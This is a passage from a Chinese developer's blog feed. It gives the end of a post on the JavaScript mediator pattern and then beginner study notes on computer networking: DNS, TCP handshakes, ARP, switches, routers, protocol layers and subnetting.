class="string">&quot;red|16G&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="string">&quot;blue|32G&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">&quot;blue|16G&quot;</span>: <span class="number">6</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mediator = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> cpuSelect = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;cpuSelect&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">change</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> cpu = cpuSelect.<span class="property">value</span>,</span><br><span class="line">                stock = goods[color + <span class="string">&#x27;|&#x27;</span> + momory + <span class="string">&#x27;|&#x27;</span> +cpu];</span><br><span class="line">            <span class="keyword">if</span>(obj === cpuSelect)&#123;</span><br><span class="line">                cpuInfo.<span class="property">innerHTML</span> = cpu;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></li></ol><h3 id="三、小结"><a href="#三、小结" class="headerlink" title="三、小结"></a>三、小结</h3><p>中介者模式是迎合迪米特法则的一种实现。迪米特法则也叫最少知识原则，是指一个对象应该尽可能少地了解另外的对象(类似不和陌生人说话）。如果对象之间的拥合性太高，一个对象发生改变之后，难免会影响到其他的象，跟“城门失火，殃及池鱼”的道理是一样的。而在中介者模式里，对象之间几乎不知道彼此的存在，它们只能通过中介者对象来互相影响对方。</p><p>因此，中介者模式使各个对象之间得以解耦，以中介者和对象之间的一对多关系取代了对象之间的网状多对多关系。各个对象只需关注自身功能的实现，对象之间的交互关系交给了中介者对象来实现和维护。</p><p>不过，中介者模式也存在一些缺点。其中，最大的缺点是系统中会新增一个中介者对象，因为对象之间交互的复杂性，转移成了中介者对象的复杂性，使得中介者对象经常是巨大的。中介者对象自身往往就是一个难以维护的对象。</p><p>我们都知道，毒贩子虽然使吸毒者和制毒者之间的耦合度降低，但毒贩子也要抽走一部分利润。同样，在程序中，中介者对象要占去一部分内存。而且毒贩本身还要防止被警察抓住，因为它了解整个犯罪链条中的所有关系，这表明中介者对象自身往往是一个难以维护的对象。</p><p>中介者模式可以非常方便地对模块或者对象进行解耦，但对象之间并非一定需要解耦。在实际项目中，模块或对象之间有一些依赖关系是很正常的。毕竟我们写程序是为了快速完成项目交付生产，而不是堆砌模式和过度设计。关键就在于如何去衡量对象之间的耦合程度。一般来说，如果对象之间的复杂耦合确实导致调用和维护出现了困难，而且这些耦合度随项目的变化呈指数增长曲线，那我们就可以考虑用中介者模式来重构代码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在我们生活的世界中，每个人每个物体之间都会产生一些错综复杂的联系。在应用程序里也一样，程序由大大小小的单一对象组成，所有这些对象都按照某种关系和规则来通信。&lt;/p&gt;
&lt;p&gt;平时我们大概能记住10个朋友的电话、30家餐馆的位置。在程序里，也许一个对象会和其他10个对象打交道，</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络基础</title>
    <link href="http://cychenhaibin.github.io/2024/10/12/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    <id>http://cychenhaibin.github.io/2024/10/12/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/</id>
    <published>2024-10-12T03:43:47.000Z</published>
    <updated>2024-10-19T03:51:20.257Z</updated>
    
    <content type="html"><![CDATA[<p>在我第一次接触计网东西的时候是前端的浏览器页面右击检查，点开Network，发现里面的东西都不大了解，甚至看不懂这些是什么，但我知道这是和后端交互，给后端发送请求，学习计网时我的基础也只有2xx、3xx、4xx、5xx这些状态码的含义。其他一概不知。学习计网的第一天也是我实习的第一天。</p><p>计网的学习可以参照三本书<strong>《图解 TCP&#x2F;IP》</strong>、<strong>《图解 HTTP》</strong>、<strong>《网络是怎么连接的》</strong>和 <strong>小林coding</strong>：<a href="https://xiaolincoding.com/%EF%BC%8C%E6%9C%AC%E7%AB%99%E7%9A%84%E6%89%80%E6%9C%89%E8%AE%A1%E7%BD%91%E6%9C%89%E5%85%B3%E7%9A%84%E5%8D%9A%E5%AE%A2%E9%83%BD%E6%98%AF%E5%9C%A8%E5%B0%8F%E6%9E%97coding%E4%B8%8A%E5%9F%BA%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E7%90%86%E8%A7%A3%E5%86%99%E7%9A%84%E3%80%82">https://xiaolincoding.com/，本站的所有计网有关的博客都是在小林coding上基于自己的理解写的。</a></p><p>接下来让我们开启计网的学习！</p><h2 id="2024-10-8"><a href="#2024-10-8" class="headerlink" title="2024.10.8"></a>2024.10.8</h2><p><em><strong>当键入网址后，到页面显示，其间发生了什么</strong></em> 这个面试题是我第一次面试时被面试官问到了，当时答的一塌糊涂，完全是想到什么说什么。</p><p>下面就用小林coding里面的网络拓扑模型作为例子，看看里面会发生什么？</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%94%AE%E5%85%A5%E7%BD%91%E5%9D%80%E8%BF%87%E7%A8%8B/2.jpg" alt="简单的网络模型"></p><p><strong>首先浏览器做的第一步工作就是要对 <code>URL</code> 进行解析，从而生成发送给 <code>Web</code> 服务器的请求信息。</strong></p><p>url里面有什么？见下图：</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%94%AE%E5%85%A5%E7%BD%91%E5%9D%80%E8%BF%87%E7%A8%8B/3.jpg" alt="URL 解析"></p><p>其中http和https是访问协议，其区别是 ：</p><blockquote><p><strong>HTTP</strong> 是以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息。默认工作在 TCP 协议 80 端口。</p><p><strong>HTTPS</strong> 是一种透过计算机网络进行安全通信的传输协议。HTTPS 经由 HTTP 进行通信，但利用 SSL&#x2F;TLS 来加密数据包。HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。默认工作在 TCP 协议443端口。</p></blockquote><p>服务器名后面跟着的就是请求服务器里的文件资源。</p><p><strong>网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的hash算法进行数据完整性保护，保证数据不被篡改。</strong></p><h3 id="真实地址查询-——-DNS"><a href="#真实地址查询-——-DNS" class="headerlink" title="真实地址查询 —— DNS"></a>真实地址查询 —— DNS</h3><p><strong>通过浏览器解析 URL 并生成 HTTP 消息后，需要委托操作系统将消息发送给 <code>Web</code> 服务器。</strong></p><p>但在发送之前，还有一项工作需要完成，那就是<strong>查询服务器域名对应的 IP 地址</strong>，因为委托操作系统发送消息时，必须提供通信对象的 IP 地址。</p><p>比如我们打电话的时候，必须要知道对方的电话号码，但由于电话号码难以记忆，所以通常我们会将对方电话号 + 姓名保存在通讯录里。</p><p>所以，有一种服务器就专门保存了 <code>Web</code> 服务器域名与 <code>IP</code> 的对应关系，它就是 <code>DNS</code> 服务器。</p><p>例如：<a href="http://www.server.com.,这个最后的一个点代表根域名.`.`根域是在最顶层,它的下一层就是/">www.server.com.，这个最后的一个点代表根域名。`.`根域是在最顶层，它的下一层就是</a> <code>.com</code> 顶级域，再下面是 <code>server.com</code></p><ul><li>根 DNS 服务器（.）</li><li>顶级域 DNS 服务器（.com）</li><li>权威 DNS 服务器（server.com）</li></ul><p>域名解析的工作流程：【小林coding里面写的很详细，在这里使用小林coding的图来展示】</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%94%AE%E5%85%A5%E7%BD%91%E5%9D%80%E8%BF%87%E7%A8%8B/6.jpg" alt="域名解析的工作流程"></p><p>浏览器会先看自身有没有对这个域名的缓存，如果有，就直接返回，如果没有，就去问操作系统，操作系统也会去看自己的缓存，如果有，就直接返回，如果没有，再去 hosts 文件看，也没有，才会去问「本地 DNS 服务器」。</p><h2 id="2024-10-9"><a href="#2024-10-9" class="headerlink" title="2024.10.9"></a>2024.10.9</h2><p>昨天<em><strong>当键入网址后，到页面显示，其间发生了什么</strong></em> 这个问题还没写完，今天继续！</p><h3 id="指南好帮手-——-协议栈"><a href="#指南好帮手-——-协议栈" class="headerlink" title="指南好帮手 —— 协议栈"></a>指南好帮手 —— 协议栈</h3><p><strong>通过 DNS 获取到 IP 后，就可以把 HTTP 的传输工作交给操作系统中的协议栈。</strong></p><p>协议栈的内部分为几个部分，分别承担不同的工作。上下关系是有一定的规则的，上面的部分会向下面的部分委托工作，下面的部分收到委托的工作并执行。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%94%AE%E5%85%A5%E7%BD%91%E5%9D%80%E8%BF%87%E7%A8%8B/7.jpg" alt="img"></p><h3 id="可靠传输-——-TCP"><a href="#可靠传输-——-TCP" class="headerlink" title="可靠传输 —— TCP"></a>可靠传输 —— TCP</h3><p>HTTP 是基于 TCP 协议传输的，先了解一下TCP协议。</p><p>TCP 传输数据之前，要先三次握手建立连接：</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost4/%E7%BD%91%E7%BB%9C/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.drawio.png" alt="TCP 三次握手"></p><p>用TCP协议把数据包送出去后，TCP不会对传达后的情况置之不理，它一定会向对方确认是否成功送达。握手过程中使用了TCP的标志——SYN和ACK。</p><p>发送端首先发送一个带有SYN标志的数据包给对方。接收端收到后，回传一个带有SYN&#x2F;ACK标志的数据包以示传达确认信息。最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。</p><h2 id="2024-10-10"><a href="#2024-10-10" class="headerlink" title="2024.10.10"></a>2024.10.10</h2><h2 id="远程定位-——-IP"><a href="#远程定位-——-IP" class="headerlink" title="远程定位 —— IP"></a>远程定位 —— IP</h2><p>TCP模块在执行连接、收发、断开等各阶段操作时，都需要委托IP模块将数据封装成 <strong>网络包</strong> 发送给通信对象。</p><p>在IP协议里面需要有<strong>源地址IP</strong>和<strong>目标地址IP</strong>：</p><ul><li>源地址IP，时客户端输出的IP地址；</li><li>目标地址，通过DNS域名解析得到的Web服务器IP。</li></ul><h2 id="两点传输-——-MAC"><a href="#两点传输-——-MAC" class="headerlink" title="两点传输 —— MAC"></a>两点传输 —— MAC</h2><p><strong>生成了 IP 头部之后，接下来网络包还需要在 IP 头部的前面加上 MAC 头部。</strong></p><p>MAC 头部是以太网使用的头部，它包含了接收方和发送方的 MAC 地址等信息。</p><p>在 MAC 包头里需要<strong>发送方 MAC 地址</strong>和<strong>接收方目标 MAC 地址</strong>，用于<strong>两点之间的传输</strong>。</p><p>一般在 TCP&#x2F;IP 通信里，MAC 包头的<strong>协议类型</strong>只使用：</p><ul><li><p><code>0800</code>：IP协议</p></li><li><p><code>0806</code>：ARP协议</p></li></ul><blockquote><p>MAC发送方和接收方如何确认？</p></blockquote><p><strong>发送方</strong>的MAC地址获取就比较简单，MAC地址是在网卡生产时写入到ROM里的，只要将这个值读取出来写入到MAC头部就可以了。</p><p><strong>接收方</strong>的MAC地址就有点复杂了，只要告诉以太网对方的MAC的地址，以太网就会帮我们把包发送过去，那么很显然这里应该填写对方的MAC地址。</p><p>所以先得搞清楚应该把包发给谁，这个只要查一下<strong>路由表</strong>就知道了。在路由表中找到相匹配的条目，然后把包发给 <code>Gateway</code> 列中的 IP 地址就可以了。</p><blockquote><p>既然知道要发给谁，按如何获取对方的 MAC 地址呢？</p></blockquote><p>此时就需要 <code>ARP</code> 协议帮我们找到路由器的MAC地址。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%94%AE%E5%85%A5%E7%BD%91%E5%9D%80%E8%BF%87%E7%A8%8B/19.jpg" alt="ARP 广播"></p><p>ARP协议会在以太网中以 <strong>广播</strong> 的形式，对以太网所有的设备喊出：”这个IP地址是谁的？请把你的MAC地址告诉我”。</p><p>然后就会有人回答：“这个 IP 地址是我的，我的 MAC 地址是 XXXX”。</p><p>如果对方和自己处于同一个子网中，那么通过上面的操作就可以得到对方的 MAC 地址。然后，我们将这个 MAC 地址写入 MAC 头部，MAC 头部就完成了。</p><blockquote><p>好像每次都要广播获取，这不是很麻烦吗？</p></blockquote><p>在后续操作系统会把本次查询结果放到一块叫做 <strong>ARP 缓存</strong>的内存空间留着以后用，不过缓存的时间就几分钟。</p><ul><li>先查询ARP缓存，如果其中已经保存了对方的MAC地址，就不需要发送ARP查询，直接使用ARP缓存中的地址。</li><li>而当ARP缓存中不存在对方MAC地址时，则发送ARP广播查询</li></ul><blockquote><p>查看 ARP 缓存内容</p></blockquote><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%94%AE%E5%85%A5%E7%BD%91%E5%9D%80%E8%BF%87%E7%A8%8B/20.jpg" alt="ARP 缓存内容"></p><h3 id="出口——网卡"><a href="#出口——网卡" class="headerlink" title="出口——网卡"></a>出口——网卡</h3><p>网络包只是存放在内存中的一串二进制数字信息，没有办法直接发送给对方。因此，我们需要将<strong>数字信息转换为电信号</strong>，才能在网线上传输，也就是说，这才是真正的数据发送过程。</p><p>负责执行这一操作的是<strong>网卡</strong>，要控制网卡还需要靠<strong>网卡驱动程序</strong>。</p><p>网卡驱动获取网络包之后，会将其<strong>复制</strong>到网卡内的缓存区中，接着会在其<strong>开头加上报头和起始帧分界符，在末尾加上用于检测错误的帧校验序列</strong>。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost4/%E7%BD%91%E7%BB%9C/%E6%95%B0%E6%8D%AE%E5%8C%85.drawio.png" alt="数据包"></p><ul><li>起始帧分界符是一个用来表示包起始位置的标记</li><li>末尾的 <code>FCS</code>（帧校验序列）用来检查包传输过程是否有损坏</li></ul><p>最后网卡会将包转为电信号，通过网线发送出去。</p><h3 id="送别者——交换机"><a href="#送别者——交换机" class="headerlink" title="送别者——交换机"></a>送别者——交换机</h3><p>下面来看一下包是如何通过交换机的。交换机的设计是将网络包<strong>原样</strong>转发到目的地。交换机工作在 MAC层，也称为<strong>二层网络设备</strong>。</p><blockquote><p>交换机的包接收操作</p></blockquote><p>首先，电信号到达网线接口，交换机里的模块进行接收，接下来交换机里的模块将电信号转换为数字信号。然后通过包末尾的 <code>FCS</code> 校验错误，如果没问题则放到缓冲区。这部分操作基本和计算机的网卡相同，但交换机的工作方式和网卡不同。</p><p>计算机的网卡本身具有MAC地址，并通过核对接收到的包的接收方MAC地址判断是不是发给自己的，如果不是发给自己的则丢弃；相对地，交换机的端口不核对接收方 MAC 地址，而是直接接收所有的包并存放到缓冲区中。因此，和网卡不同，<strong>交换机的端口不具有 MAC 地址</strong>。</p><p>将包存入缓冲区后，接下来需要查询一下这个包的接收方 MAC 地址是否已经在 MAC 地址表中有记录了。</p><p>交换机的 MAC 地址表主要包含两个信息：</p><ul><li>一个是设备的 MAC 地址，</li><li>另一个是该设备连接在交换机的哪个端口上。</li></ul><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%94%AE%E5%85%A5%E7%BD%91%E5%9D%80%E8%BF%87%E7%A8%8B/23.jpg" alt="交换机的 MAC 地址表"></p><p>如果收到的包的接收方 MAC 地址为 <code>00-02-B3-1C-9C-F9</code>，则与图中表中的第 3 行匹配，根据端口列的信息，可知这个地址位于 <code>3</code> 号端口上，然后就可以通过交换电路将包发送到相应的端口了。</p><p>所以，<strong>交换机根据 MAC 地址表查找 MAC 地址，然后将信号发送到相应的端口</strong>。</p><blockquote><p>当 MAC 地址表找不到指定的 MAC 地址会怎么样？</p></blockquote><p>地址表中找不到指定的 MAC 地址。这可能是因为具有该地址的设备还没有向交换机发送过包，或者这个设备一段时间没有工作导致地址被从地址表中删除了。</p><p>这种情况下，交换机无法判断应该把包转发到哪个端口，只能将包转发到除了源端口之外的所有端口上，无论该设备连接在哪个端口上都能收到这个包。</p><p>这样做不会产生什么问题，因为以太网的设计本来就是将包发送到整个网络的，然后<strong>只有相应的接收者才接收包，而其他设备则会忽略这个包</strong>。</p><p>有人会说：“这样做会发送多余的包，会不会造成网络拥塞呢？”</p><p>其实完全不用过于担心，因为发送了包之后目标设备会作出响应，只要返回了响应包，交换机就可以将它的地址写入 MAC 地址表，下次也就不需要把包发到所有端口了。</p><p>局域网中每秒可以传输上千个包，多出一两个包并无大碍。</p><p>此外，如果接收方 MAC 地址是一个<strong>广播地址</strong>，那么交换机会将包发送到除源端口之外的所有端口。</p><p>以下两个属于广播地址：</p><ul><li>MAC 地址中的 <code>FF:FF:FF:FF:FF:FF</code></li><li>IP 地址中的 <code>255.255.255.255</code></li></ul><h2 id="2024-10-12"><a href="#2024-10-12" class="headerlink" title="2024.10.12"></a>2024.10.12</h2><p>昨天太忙了。。。</p><h3 id="出境大门——路由器"><a href="#出境大门——路由器" class="headerlink" title="出境大门——路由器"></a>出境大门——路由器</h3><p>网络包经过交换机之后，现在到达了<strong>路由器</strong>，并在此被转发到下一个路由器或目标设备。</p><p>这一步转发的工作原理和交换机类似，也是通过查表判断包转发的目标。</p><blockquote><p>路由器与交换机的区别</p></blockquote><ul><li>因为 <strong>路由器</strong> 是基于IP设计的，俗称<strong>三层</strong>网络设备，路由器的各个端口都具有 MAC 地址和 IP 地址；</li><li>而 <strong>交换机</strong> 是基于以太网设计的，俗称<strong>二层</strong>网络设备，交换机的端口不具有 MAC 地址。</li></ul><blockquote><p>路由器基本原理</p></blockquote><p>路由器的端口具有 MAC 地址，因此它就能够成为以太网的发送方和接收方；同时还具有 IP 地址，从这个意义上来说，它和计算机的网卡是一样的。</p><p>当转发包时，首先路由器端口会接收发给自己的以太网包，然后<strong>路由表</strong>查询转发目标，再由相应的端口作为发送方将以太网包发送出去。</p><blockquote><p>路由器的包接收操作</p></blockquote><p>首先，电信号到达网线接口部分，路由器中的模块会将电信号转成数字信号，然后通过包末尾的 <code>FCS</code> 进行错误校验。</p><p>如果没问题则检查 MAC 头部中的<strong>接收方 MAC 地址</strong>，看看是不是发给自己的包，如果是就放到接收缓冲区中，否则就丢弃这个包。</p><p>总的来说，路由器的端口都具有 MAC 地址，只接收与自身地址匹配的包，遇到不匹配的包则直接丢弃。</p><blockquote><p>查询路由表确定输出端口</p></blockquote><p><strong>完成包接收操作之后，路由器就会去掉包开头的 MAC 头部。</strong></p><p>接下来，路由器会根据 MAC 头部后方的 <code>IP</code> 头部中的内容进行包的转发操作。</p><p>转发操作分为几个阶段，首先是查询<strong>路由表</strong>判断转发目标。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%94%AE%E5%85%A5%E7%BD%91%E5%9D%80%E8%BF%87%E7%A8%8B/24.jpg" alt="路由器转发"></p><blockquote><p>路由器的发送操作</p></blockquote><p>进入包的<strong>发送操作</strong></p><p>首先，我们需要根据<strong>路由表的网关列</strong>判断对方的地址。</p><ul><li>如果网关是一个 IP 地址，则这个IP 地址就是我们要转发到的目标地址，<strong>还未抵达终点</strong>，还需继续需要路由器转发。</li><li>如果网关为空，则 IP 头部中的接收方 IP 地址就是要转发到的目标地址，也是就终于找到 IP 包头里的目标地址了，说明<strong>已抵达终点</strong>。</li></ul><p>知道对方的 IP 地址之后，接下来需要通过 <code>ARP</code> 协议根据 IP 地址查询 MAC 地址，并将查询的结果作为接收方 MAC 地址。</p><p>路由器也有 ARP 缓存，因此首先会在 ARP 缓存中查询，如果找不到则发送 ARP 查询请求。</p><p>接下来是发送方 MAC 地址字段，这里填写输出端口的 MAC 地址。还有一个以太类型字段，填写 <code>0800</code> （十六进制）表示 IP 协议。</p><p>网络包完成后，接下来会将其转换成电信号并通过端口发送出去。</p><p>发送出去的网络包会通过<strong>交换机</strong>到达下一个路由器。由于接收方 MAC 地址就是下一个路由器的地址，所以交换机会根据这一地址将包传输到下一个路由器。</p><p>接下来，下一个路由器会将包转发给再下一个路由器，经过层层转发之后，网络包就到达了最终的目的地。</p><p>在网络包传输的过程中，<strong>源 IP 和目标 IP 始终是不会变的，一直变化的是 MAC 地址</strong>，因为需要 MAC 地址在以太网内进行<strong>两个设备</strong>之间的包传输。</p><h3 id="相互扒皮——服务器-与-客户端"><a href="#相互扒皮——服务器-与-客户端" class="headerlink" title="相互扒皮——服务器 与 客户端"></a>相互扒皮——服务器 与 客户端</h3><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%94%AE%E5%85%A5%E7%BD%91%E5%9D%80%E8%BF%87%E7%A8%8B/25.jpg" alt="网络分层模型"></p><p>至此，<strong>当键入网址后，到页面显示，其间发生了什么？</strong>就是全部内容了。</p><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="https://xiaolincoding.com/network/1_base/what_happen_url.html#%E4%BA%92%E7%9B%B8%E6%89%92%E7%9A%AE-%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%B8%8E-%E5%AE%A2%E6%88%B7%E7%AB%AF">https://xiaolincoding.com/network/1_base/what_happen_url.html#%E4%BA%92%E7%9B%B8%E6%89%92%E7%9A%AE-%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%B8%8E-%E5%AE%A2%E6%88%B7%E7%AB%AF</a></p><br /><br /><p>通过几天的视频学习，了解了三种交换方式、性能指标和体系结构✌️，下面开始吧！这些都是我在实习期间偷偷摸摸写的，偷感好重😭😭</p><h2 id="2024-10-17"><a href="#2024-10-17" class="headerlink" title="2024.10.17"></a>2024.10.17</h2><p>常用的性能指标有以下8个：</p><ul><li>速率</li><li>带宽</li><li>吞吐量：单位时间内通过某个网络的数据量</li><li>时延：发送时延、传播时延、处理时延</li><li>时延带宽积：传播时延和带宽的乘积</li><li>往返时间</li><li>利用率</li><li>丢包率：丢失的分组数量与总分组数量的比率，分组丢失主要原因：分组误码、网络拥塞</li></ul><p><img src="/../image/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/image-20241017130703039.png" alt="image-20241017130703039"></p><h3 id="常见的计算机网络体系结构"><a href="#常见的计算机网络体系结构" class="headerlink" title="常见的计算机网络体系结构"></a>常见的计算机网络体系结构</h3><p><strong>OSI体系结构</strong></p><p>从下至上：物理层、数据链路层、网络层、运输层、会话层、表示层、应用层</p><p><strong>TCP&#x2F;IP体系结构</strong></p><p>从下至上：网络接口层、网际层、运输层、应用层</p><p><strong>原理体系结构</strong></p><p>从下至上：物理层、数据链路层、网络层、运输层、应用层</p><p><img src="/../image/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/image-20241017130638031.png" alt="image-20241017130638031"></p><p><strong>五个层次在这个过程的作用是：</strong></p><p><strong>主机发送：</strong></p><ol><li><p>应用层：根据HTTP协议构建一个报文，把报文交给运输层处理。</p></li><li><p>运输层：根据HTTP请求报文添加一个TCP首部，使之成为TCP报文段。该首部的作用：区分应用进程、实现可靠传输。然后将TCP报文段交给网络层处理。</p></li><li><p>网络层：给TCP报文段添加IP首部，是指成为IP数据报，作用是使之可以在互联网上传输（即，被路由器转发）。然后将IP数据报交给数据链路层处理。</p></li><li><p>数据链路层：给IP数据报添加首部和尾部，使之成为帧。帧首部的作用是为了让帧能够在一段链路上或一个网络上传输，能够被相应的目的主机接受。帧尾部的目的是让目的主机检查所接受到的帧是否有误码。数据链路层将帧交给物理层。</p></li><li><p>物理层：将帧看作比特流。给该比特流前加前导码，作用是让目的主机做好接受帧的准备。物理层将添加前导码的比特流变换成相应的信号发送到传输媒体，信号通过传输媒体到达路由器。</p></li></ol><p><strong>路由器转发</strong></p><ol><li>物理层：收到信号后将信号变换为比特流，去掉前导码，交付给数据链路层。实际上交付的是帧。</li><li>数据链路层：去掉帧的首部和尾部，将其交付给网络层，实际上交付的是IP数据报。</li><li>网络层：解析IP数据报的首部，从中提取目的网络地址，查找自身的路由表，确定转发端口，以便数据转发。网络层将IP数据报交付给数据链路层。</li><li>数据链路层：添加一个首部和尾部，变成帧。</li><li>物理层：接受帧，将其看作比特流，加前导码。将加了前导码的比特流变换成相应的信号发送到传输媒体。</li></ol><p><strong>服务器接收</strong></p><ol><li>物理层：信号通过传输媒体到达服务器的物理层，物理层将其变为比特流，去掉前导码，交付给数据链路层。实际上交付的是帧。</li><li>数据链路层：去掉帧的首部和尾部，将其交付给网络层，实际上交付的是IP数据报。</li><li>网络层：将IP数据报的首部去掉后，将其交付给运输层，实际上交付的是TCP报文段。</li><li>运输层：将TCP报文段的首部去掉后，将其交付给应用层。实际上交付的是HTTP请求报文。</li><li>应用层：对HTTP请求报文进行解析，然后给主机发回响应报文。</li></ol><p><img src="/../image/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/image-20241017130607193.png" alt="image-20241017130607193"></p><h2 id="2024-10-18"><a href="#2024-10-18" class="headerlink" title="2024.10.18"></a>2024.10.18</h2><h3 id="TCP-IP网络模型"><a href="#TCP-IP网络模型" class="headerlink" title="TCP&#x2F;IP网络模型"></a>TCP&#x2F;IP网络模型</h3><h4 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h4><p>专注于为用户提供应用功能，比如 HTTP、FTP、Telnet、DNS、SMTP等。专注于为用户提供应用功能，比如 HTTP、FTP、Telnet、DNS、SMTP等。而且应用层是工作在操作系统中的用户态，传输层及以下则工作在内核态。</p><h4 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h4><p>应用层的数据包会传给传输层，<strong>传输层</strong>（<em>Transport Layer</em>）是为应用层提供网络支持的。</p><p>在传输层会有两个传输协议，分别是 <strong>TCP</strong> 和 <strong>UDP</strong>。</p><h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><p>最常使用的是 IP 协议（<em>Internet Protocol</em>），IP 协议会将传输层的报文作为数据部分，再加上 IP 包头组装成 IP 报文，如果 IP 报文大小超过 MTU（以太网中一般为 1500 字节）就会<strong>再次进行分片</strong>，得到一个即将发送到网络的 IP 报文。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%94%AE%E5%85%A5%E7%BD%91%E5%9D%80%E8%BF%87%E7%A8%8B/12.jpg" alt="img"></p><p>网络层负责将数据从一个设备传输到另一个设备，世界上那么多设备，又该如何找到对方呢？因此，网络层需要有区分设备的编号。</p><p>我们一般用 IP 地址给设备进行编号，对于 IPv4 协议， IP 地址共 32 位，分成了四段（比如，192.168.100.1），每段是 8 位。只有一个单纯的 IP 地址虽然做到了区分设备，但是寻址起来就特别麻烦，全世界那么多台设备，难道一个一个去匹配？这显然不科学。</p><p>因此，需要将 IP 地址分成两种意义：</p><ul><li><p>一个是<strong>网络号</strong>，负责标识该 IP 地址是属于哪个「子网」的；</p></li><li><p>一个是<strong>主机号</strong>，负责标识同一「子网」下的不同主机；</p></li></ul><p>怎么分的呢？这需要配合<strong>子网掩码</strong>才能算出 IP 地址 的网络号和主机号。</p><p>比如 10.100.122.0&#x2F;24，后面的<code>/24</code>表示就是 <code>255.255.255.0</code> 子网掩码，</p><p>知道了子网掩码，该怎么计算出网络地址和主机地址呢？</p><p>将 10.100.122.2 和 255.255.255.0 进行<strong>按位与运算</strong>，就可以得到网络号，如下图：</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/IP/16.jpg" alt="img"></p><p>将 255.255.255.0 取反后与IP地址进行进行<strong>按位与运算</strong>，就可以得到主机号。</p><p>那么在寻址的过程中，先匹配到相同的网络号（表示要找到同一个子网），才会去找对应的主机。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/IP/17.jpg" alt="IP地址的网络号"></p><p>所以，<strong>IP 协议的寻址作用是告诉我们去往下一个目的地该朝哪个方向走，路由则是根据「下一个目的地」选择路径。寻址更像在导航，路由更像在操作方向盘</strong>。</p><h3 id="网络接口层"><a href="#网络接口层" class="headerlink" title="网络接口层"></a>网络接口层</h3><p>生成了 IP 头部之后，接下来要交给<strong>网络接口层</strong>（<em>Link Layer</em>）在 IP 头部的前面加上 MAC 